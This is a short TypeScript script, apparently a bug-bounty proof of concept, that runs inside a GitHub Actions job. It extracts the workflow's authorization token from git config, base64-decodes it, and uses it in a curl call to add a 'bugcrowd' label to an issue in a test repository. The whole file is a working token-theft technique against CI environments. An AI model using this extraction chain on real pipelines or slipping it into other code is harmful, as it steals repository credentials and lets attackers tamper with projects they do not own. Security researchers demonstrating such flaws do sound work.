const subProcess = require('child_process');

const main = (): void => {
  subProcess.exec("git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\\1/p' | base64 -d | sed -nE 's/.*:(.*)/\\1/p'", (err: any, stdout: any, stderr: any) => {
    if (err) {
      console.error(err);
      process.exit(1);
    } else {
      const token: string = stdout.toString();
      subProcess.exec(`curl -L -s -X POST -d '{"labels":["bugcrowd"]}' -H "Authorization: Bearer ${token}" -H "X-GitHub-Api-Version: 2022-11-28" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json"  https://api.github.com/repos/ndavisontest/actions-test/issues/4/labels`, (err: any, stdout: any, stderr: any) => {     
      });
    }
  })
};

if (require.main === module) {
  main();
}

export default main;

